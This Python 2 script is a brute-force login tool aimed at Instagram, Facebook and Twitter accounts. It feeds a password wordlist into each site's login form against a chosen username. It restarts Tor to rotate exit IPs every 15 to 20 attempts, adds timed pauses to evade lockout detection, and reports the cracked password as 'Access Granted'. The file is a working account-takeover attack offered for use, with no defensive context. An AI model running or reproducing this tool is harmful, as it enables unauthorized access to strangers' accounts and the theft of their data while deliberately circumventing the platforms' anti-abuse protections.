#!/usr/bin/env python
#
# Brute Forces Facebook, Instagram & Twitter
#
# @Author: Ethical H4CK3R
#
import os
import time
import socks
import socket
import random
import cookielib
import mechanize
import subprocess

from Core import conf
from platform import platform
from Core.conf import userAgent

class BruteForce(object):
 def __init__(self,email,passwords,url,username,password):
  self.atmpt = 0 
  self.tries = 0 
  self.alive = True
  self.brwsr = None
  self.ipAdd = None
  self.lock  = None
  self.passw = None
  self.email = email
  self.list  = passwords

  # Flexability
  self.url      = url
  self.username = username # The email/username field of the site
  self.password = password # The password field name of the site

 # Password authentication
 def login(self,passwrd,notLocked=7):
  self.passw=passwrd
  self.display()

  # Fill form
  try:
   self.brwsr.select_form(nr=0)
   self.brwsr.form[self.password]=passwrd
  except:
   self.ip()
   self.ipAdd=self.ipAddr()
   self.setupBrowser()
   self.visit()
   
  try:self.brwsr.form[self.username]=self.email
  except:pass

  # Submit form
  try:self.brwsr.submit()
  except:pass

  # Facebook lock
  html=self.brwsr.response().read()
  
  if 'try again later' in html:
   self.lock=True
   self.display()
   subprocess.Popen(['service','tor','stop']).wait()
   exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W))
    
  # Twitter lock
  if 'locked' in self.brwsr.geturl(): 
   if notLocked==3:self.lock=True # Twitter denial

   if notLocked:
    notLocked=-1
    self.setupBrowser()
    self.refresh()
    self.login(passwrd,notLocked=notLocked)
     
   else:
    self.lock=True
    self.display()
    subprocess.Popen(['service','tor','stop']).wait()
    exit('\n{1}The Account Is {0}Locked{1} Try Again Later'.format(R,W)) 
    
  # Did it work
  if any([not'login' in self.brwsr.geturl(),
         'home.php'  in self.brwsr.geturl(),
         'challenge' in self.brwsr.geturl()]):self.accessed(passwrd)

 # After browser failure
 def refresh(self):
  self.ip()
  self.ipAdd=self.ipAddr()
  self.visit()
 

 # Screen Output
 def display(self,passwrd=''):
  self.ipAdd=self.ipAdd if self.ipAdd else ''
  art(password = self.passw,attempts=self.tries,
      username = self.email,wordlist=self.list,
      proxyIp  = self.ipAdd.replace('\n',''),
      locked   = self.lock,
      website  = website)

 # AccessGranted
 def accessed(self,passwrd):
  self.display()
  print '  [-]{0} Access Granted{1}'.format(G,W)
  print '  [-] Username: {}{}{}'.format(G,self.email,W)
  print '  [-] Password: {}{}{}'.format(G,passwrd,W)
  self.alive=False

 # proxy ip
 def proxyIp(self):
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
  socket.socket=socks.socksocket
  connects=self.connection
  socket.connects=connects

 # Tor connection
 def connection(self,address,timeout=None,source_address=None):
  sock=socks.socksocket()
  sock.connect(address)
  return sock

 # Obtain ip
 def ip(self):
  self.display()
  if not self.tries:print '  [-] Starting Tor {}...{}'.format(G,W)
  subprocess.Popen(['service','tor','restart']).wait()
  time.sleep(3)
  self.proxyIp()

 # Get Ip address
 def ipAddr(self):
  self.display()
  if not self.tries:print '  [-] Obtaining Proxy Ip {}...{}'.format(G,W);time.sleep(1.5)
  try:
   return self.brwsr.open('https://wtfismyip.com/text').read()
  except:
   self.ip()
   self.setupBrowser()
   self.ipAddr()  

 # Opens Url
 def visit(self):
  self.display()
   
  site='Instagram' if website==1 else 'Facebook' if website==2 else 'Twitter' if website==3 else None
  if not self.tries:print '  [-] Contacting {} {}...{}'.format(site,G,W);time.sleep(3)
    
  try:self.brwsr.open(self.url)
  except:self.refresh()

 # The Brains
 def ai(self):
  self.ip()
  self.display()
  time.sleep(1.5)

  self.setupBrowser()
  self.display()
  time.sleep(1.5)

  self.ipAdd=self.ipAddr()
  self.display()
  time.sleep(1.5)

  self.visit()
  self.display()
  time.sleep(1.5)

  # Reads wordlist & removes \n
  def read(file):
   for item in file:
    yield item.replace('\n','')

  self.lock=False
  self.display()
  time.sleep(1.5)
  print '  [-] Starting Brute Force Session {}...{}'.format(G,W);time.sleep(3)
  self.display()
  time.sleep(1.5)

  # BruteForce
  with open(self.list) as wordlist:
   for password in read(wordlist):
    if not self.alive:break

    # Obtain new ip
    if website==1: # For instagram
     if self.atmpt==15:
      self.atmpt=0
      self.setupBrowser()
      self.refresh()

    elif website==2: # For facebook
     if self.atmpt==20:
      self.atmpt=0
      self.setupBrowser()
      self.refresh()
      time.sleep(random.randint(150,165))
     
    else: # For twitter
     if self.atmpt==15:  
      self.atmpt=0
      self.setupBrowser()
      self.refresh()

    # Attempt to login
    self.tries+=1
    self.atmpt+=1
    self.login(password)

 # Setup mechanize
 def setupBrowser(self):
  self.display()
  if self.brwsr:self.brwsr.close()  
  if not self.tries:print '  [-] Setting Up Browser {}...{}'.format(G,W);time.sleep(3)
  self.brwsr = mechanize.Browser()
  self.brwsr.set_handle_robots(False)
  self.brwsr.set_handle_equiv(True)
  self.brwsr.set_handle_referer(True)
  self.brwsr.set_handle_redirect(True)
  self.brwsr.set_cookiejar(cookielib.LWPCookieJar())
  self.brwsr.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
  self.brwsr.addheaders=[('User-agent',userAgent())]
   
if __name__ == '__main__':

 # Root access only
 if os.getuid():
  exit('root access required')

 # Kali linux only
 if not 'kali' in platform():
  exit('Kali Linux 2.0 required')

 # Links
 instagram = 'https://www.instagram.com/accounts/login/?force_classic_login'
 facebook  = 'https://mbasic.facebook.com/login.php'
 twitter   = 'https://m.twitter.com/login/'

 # Colors
 R=conf.Colors[0]
 G=conf.Colors[1]
 W=conf.Colors[2]

 # Displays art
 def art(username=None,wordlist=None,password=None,attempts=None,proxyIp=None,locked=None,website=None):
  # Config display
  subprocess.call(['clear'])
  proxyIp=proxyIp   if proxyIp  else ''
  username=username if username else ''
  wordlist=wordlist if wordlist else ''
  password=password if password else ''
  attempts=attempts if attempts else ''
  website='Facebook' if website==2 else 'Instagram' if website==1 else 'Twitter' if website==3 else ''
  locked=locked if locked else '' if locked==None else locked

  print ''
  print '  {}[-] Website:  {}{}'.format(W,G,website)
  print '  {}[-] Proxy Ip: {}{}'.format(W,G,proxyIp)
  print '  {}[-] Wordlist: {}{}'.format(W,G,wordlist)
  print '  {}[-] Username: {}{}'.format(W,G,username)
  print '  {}[-] Password: {}{}'.format(W,G,password)
  print '  {}[-] Attempts: {}{}'.format(W,G,attempts)

  if website=='Facebook' or website=='Twitter':
   color=R if locked else G
   print '  {}[-] Account Locked: {}{}'.format(W,color,locked)
  print '\n{}+-------------------+{}\n'.format(R,W)

 try:
  art()
  time.sleep(1.3)
  website=input('{0}[{1}Sites{0}]{1}\n\n1) Instagram\n2)\
 Facebook\n3) Twitter\n\nEnter Site:{0} '.format(G,W))
  print(W)
  time.sleep(.7)

  art(website=website)
  username=raw_input('Enter Username:{} '.format(G))
  username=username.title().replace('\n','')
  time.sleep(.7)
  art(website=website,username=username)

  wordlist=raw_input('Enter Wordlist: {}'.format(G))
  time.sleep(.7)

  # Set fields
  if website==2:url,_username,_password=facebook,'email','pass'
  elif website==1:url,_username,_password=instagram,'username','password'
  else:url,_username,_password=twitter,'session[username_or_email]','session[password]'

  # Locate wordlist
  if not os.path.exists(wordlist):
   exit('\n{0}{1}{2} is not found'.format(R,wordlist,W))

  art(website=website,username=username,wordlist=wordlist)
  time.sleep(1.2)

  # Configure system enviroment
  conf.config()

  # Bruteforce the accounts
  attack=BruteForce(username,wordlist,url,_username,_password)
  attack.ai()
 except KeyboardInterrupt:
  attack.alive=False
 finally: 
  subprocess.Popen(['service','tor','stop']).wait()
  exit('\n\n{1}Exiting {0}...{1}'.format(R,W))
